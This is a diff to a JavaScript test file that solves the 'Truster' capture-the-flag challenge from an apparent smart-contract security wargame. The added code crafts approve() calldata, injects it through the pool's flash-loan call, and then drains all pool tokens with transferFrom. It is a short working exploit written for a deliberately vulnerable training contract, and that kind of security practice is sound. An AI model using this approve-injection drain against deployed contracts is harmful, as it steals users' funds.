@@ -21,8 +21,18 @@ describe('[Challenge] Truster', function () {
         expect(await token.balanceOf(player.address)).to.equal(0);
     });
 
-    it('Execution', async function () {
+    it('Execution Truster', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // If we target the token contract to call one of its function and call approve, we can manipulate the
+        // allowance of the contract for the amount we want to the address we want
+
+        // Data to call approve with being the amount type(uint256).max = 0xffff...ffff and the spender player address
+        // approve(address, uint256) function selector = 095ea7b3
+        data = "0x095ea7b3" + "000000000000000000000000" + player.address.toString().substring(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        await pool.connect(player).flashLoan(0, player.address, token.address, data);
+
+        //Now player is approved to spend all the pool tokens
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
     });
 
     after(async function () {
